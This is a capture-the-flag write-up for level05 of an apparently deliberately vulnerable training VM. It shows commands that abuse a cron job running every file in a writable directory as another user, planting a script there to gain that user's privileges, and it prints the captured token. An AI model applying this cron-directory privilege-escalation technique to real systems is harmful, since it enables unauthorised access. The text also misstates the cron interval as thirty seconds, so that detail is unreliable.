# Flag 05

After connecting to the level05 we got a message

```
 ssh level05@192.168.1.106 -p 4242
	   _____                      _____               _     
	  / ____|                    / ____|             | |    
	 | (___  _ __   _____      _| |     _ __ __ _ ___| |__  
	  \___ \| '_ \ / _ \ \ /\ / / |    | '__/ _` / __| '_ \ 
	  ____) | | | | (_) \ V  V /| |____| | | (_| \__ \ | | |
	 |_____/|_| |_|\___/ \_/\_/  \_____|_|  \__,_|___/_| |_|
                                                        
  Good luck & Have fun

          192.168.1.106 
level05@192.168.1.106's password: 
You have new mail.

```

We checked the mail and we found what it looks like a crontab that execute a script every 30 second

```bash
level05@SnowCrash:/$ cat /var/mail/level05 
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

The script executes all files in `/opt/openarenaserver/` and as flag05 and delete theme

```bash
level05@SnowCrash:/$ ls -l /usr/sbin/openarenaserver
-rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver

level05@SnowCrash:/$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

So if we create a script in the `/opt/openarenaserver/` directory it will be executed by flag05 

```bash
level05@SnowCrash:/$ echo "getflag > /tmp/flag05" > /opt/openarenaserver/getflag05

```

We waited after the crontab execute the scripts and we got our flag

```bash
level05@SnowCrash:/$ cat /tmp/flag05
Check flag.Here is your token : viuaaale9huek52boumoomioc
```



